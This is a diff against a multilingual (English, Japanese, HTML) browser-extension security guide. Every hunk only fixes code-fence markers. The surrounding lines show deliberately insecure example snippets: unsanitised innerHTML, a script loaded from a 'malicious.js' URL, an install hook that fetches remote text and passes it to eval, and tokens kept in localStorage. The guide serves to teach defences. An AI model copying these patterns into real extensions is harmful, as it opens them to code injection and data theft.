@@ -46,7 +46,7 @@ Browser extensions sometimes request more permissions than they actually need. T
     "storage"
   ]
 }
-```text
+```
 
 ### Mitigation: Permissions Overreach
 
@@ -69,7 +69,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     });
   }
 });
-```text
+```
 
 ### Mitigation: Data Leakage
 
@@ -86,7 +86,7 @@ If user input is not properly sanitized, attackers can inject malicious scripts 
 ```javascript
 let userInput = document.getElementById('input').value;
 document.getElementById('output').innerHTML = userInput; // No sanitization
-```text
+```
 
 ### Mitigation: Cross-Site Scripting (XSS)
 
@@ -102,7 +102,7 @@ Some extensions send sensitive data over unsecured HTTP connections, making it v
 
 ```javascript
 fetch('http://example.com/api/data');
-```text
+```
 
 ### Mitigation: Insecure Communication
 
@@ -120,7 +120,7 @@ An extension that dynamically loads scripts from an untrusted source can be expl
 let script = document.createElement('script');
 script.src = 'http://example.com/malicious.js';
 document.body.appendChild(script);
-```text
+```
 
 ### Mitigation: Code Injection
 
@@ -140,7 +140,7 @@ chrome.runtime.onInstalled.addListener(() => {
     .then(response => response.text())
     .then(eval); // Unsafe!
 });
-```text
+```
 
 ### Mitigation: Malicious Updates
 
@@ -162,7 +162,7 @@ Using outdated or vulnerable third-party libraries in an extension can introduce
     "vulnerable-lib": "1.0.0"
   }
 }
-```text
+```
 
 ### Mitigation: Third-Party Dependencies
 
@@ -182,7 +182,7 @@ Without a strict CSP, attackers can inject scripts into an extension’s web pag
   "name": "My Extension",
   "content_security_policy": "default-src 'self'"
 }
-```text
+```
 
 ### Mitigation: Lack of Content Security Policy (CSP)
 
@@ -198,7 +198,7 @@ Storing sensitive data like authentication tokens in localStorage or other unsec
 
 ```javascript
 localStorage.setItem('token', 'my-secret-token'); // No encryption
-```text
+```
 
 ### Mitigation: Insecure Storage
 
@@ -220,7 +220,7 @@ If an extension does not clearly define how it collects and handles user data, i
   "name": "My Extension",
   "description": "A cool extension with no privacy policy."
 }
-```text
+```
 
 ### Mitigation: Insufficient Privacy Controls
 
@@ -251,7 +251,7 @@ const userData = {
 const userInfoDiv = document.createElement('div');
 userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
 document.body.appendChild(userInfoDiv);
-```text
+```
 
 ### Mitigation: DOM-based Data Skimming
 
@@ -302,7 +302,7 @@ window.addEventListener('message', (data) => {
     window.apiController.apiKey = data.apiKey;
   }
 })
-```text
+```
 
 ### Mitigation: Prototype-based Data Skimming
 
@@ -328,7 +328,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```text
+```
 
 ### Mitigation: Insecure Message Passing
 
@@ -351,7 +351,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```text
+```
 
 ## Conclusion
 
@@ -384,7 +384,7 @@ By following these security best practices, developers can build safer browser e
     "storage"
   ]
 }
-```text
+```
 
 ### 対策: 権限の過剰要求
 
@@ -407,7 +407,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     });
   }
 });
-```text
+```
 
 ### 対策: データ漏洩
 
@@ -424,7 +424,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 ```javascript
 let userInput = document.getElementById('input').value;
 document.getElementById('output').innerHTML = userInput; // No sanitization
-```text
+```
 
 ### 対策: クロスサイトスクリプティング (XSS)
 
@@ -440,7 +440,7 @@ document.getElementById('output').innerHTML = userInput; // No sanitization
 
 ```javascript
 fetch('http://example.com/api/data');
-```text
+```
 
 ### 対策: 安全でない通信
 
@@ -458,7 +458,7 @@ fetch('http://example.com/api/data');
 let script = document.createElement('script');
 script.src = 'http://example.com/malicious.js';
 document.body.appendChild(script);
-```text
+```
 
 ### 対策: コードインジェクション
 
@@ -478,7 +478,7 @@ chrome.runtime.onInstalled.addListener(() => {
     .then(response => response.text())
     .then(eval); // Unsafe!
 });
-```text
+```
 
 ### 対策: 悪意のある更新
 
@@ -498,7 +498,7 @@ chrome.runtime.onInstalled.addListener(() => {
     "vulnerable-lib": "1.0.0"
   }
 }
-```text
+```
 
 ### 対策: サードパーティ依存関係
 
@@ -518,7 +518,7 @@ chrome.runtime.onInstalled.addListener(() => {
   "name": "My Extension",
   "content_security_policy": "default-src 'self'"
 }
-```text
+```
 
 ### 対策: Content Security Policy (CSP) の欠如
 
@@ -534,7 +534,7 @@ chrome.runtime.onInstalled.addListener(() => {
 
 ```javascript
 localStorage.setItem('token', 'my-secret-token'); // No encryption
-```text
+```
 
 ### 対策: 安全でないストレージ
 
@@ -554,7 +554,7 @@ localStorage.setItem('token', 'my-secret-token'); // No encryption
   "name": "My Extension",
   "description": "A cool extension with no privacy policy."
 }
-```text
+```
 
 ### 対策: 不十分なプライバシー管理
 
@@ -585,7 +585,7 @@ const userData = {
 const userInfoDiv = document.createElement('div');
 userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
 document.body.appendChild(userInfoDiv);
-```text
+```
 
 ### 対策: DOM ベースのデータスキミング
 
@@ -636,7 +636,7 @@ window.addEventListener('message', (data) => {
     window.apiController.apiKey = data.apiKey;
   }
 })
-```text
+```
 
 ### 対策: プロトタイプベースのデータスキミング
 
@@ -662,7 +662,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```text
+```
 
 ### 対策: 安全でないメッセージ受け渡し
 
@@ -684,7 +684,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```text
+```
 
 ## まとめ
 
@@ -763,7 +763,7 @@ Browser extensions sometimes request more permissions than they actually need. T
     "storage"
   ]
 }
-```html
+```
 
 </div>
 
@@ -847,7 +847,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     });
   }
 });
-```html
+```
 
 </div>
 
@@ -925,7 +925,7 @@ If user input is not properly sanitized, attackers can inject malicious scripts 
 ```javascript
 let userInput = document.getElementById('input').value;
 document.getElementById('output').innerHTML = userInput; // No sanitization
-```html
+```
 
 </div>
 
@@ -1002,7 +1002,7 @@ Some extensions send sensitive data over unsecured HTTP connections, making it v
 
 ```javascript
 fetch('http://example.com/api/data');
-```html
+```
 
 </div>
 
@@ -1081,7 +1081,7 @@ An extension that dynamically loads scripts from an untrusted source can be expl
 let script = document.createElement('script');
 script.src = 'http://example.com/malicious.js';
 document.body.appendChild(script);
-```html
+```
 
 </div>
 
@@ -1162,7 +1162,7 @@ chrome.runtime.onInstalled.addListener(() => {
     .then(response => response.text())
     .then(eval); // Unsafe!
 });
-```html
+```
 
 </div>
 
@@ -1245,7 +1245,7 @@ Using outdated or vulnerable third-party libraries in an extension can introduce
     "vulnerable-lib": "1.0.0"
   }
 }
-```html
+```
 
 </div>
 
@@ -1326,7 +1326,7 @@ Without a strict CSP, attackers can inject scripts into an extension’s web pag
   "name": "My Extension",
   "content_security_policy": "default-src 'self'"
 }
-```html
+```
 
 </div>
 
@@ -1403,7 +1403,7 @@ Storing sensitive data like authentication tokens in localStorage or other unsec
 
 ```javascript
 localStorage.setItem('token', 'my-secret-token'); // No encryption
-```html
+```
 
 </div>
 
@@ -1486,7 +1486,7 @@ If an extension does not clearly define how it collects and handles user data, i
   "name": "My Extension",
   "description": "A cool extension with no privacy policy."
 }
-```html
+```
 
 </div>
 
@@ -1604,7 +1604,7 @@ const userData = {
 const userInfoDiv = document.createElement('div');
 userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
 document.body.appendChild(userInfoDiv);
-```html
+```
 
 </div>
 
@@ -1809,7 +1809,7 @@ window.addEventListener('message', (data) => {
     window.apiController.apiKey = data.apiKey;
   }
 })
-```html
+```
 
 </div>
 
@@ -1922,7 +1922,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     fetch(SECRET_API_URL);
   }
 });
-```html
+```
 
 </div>
 
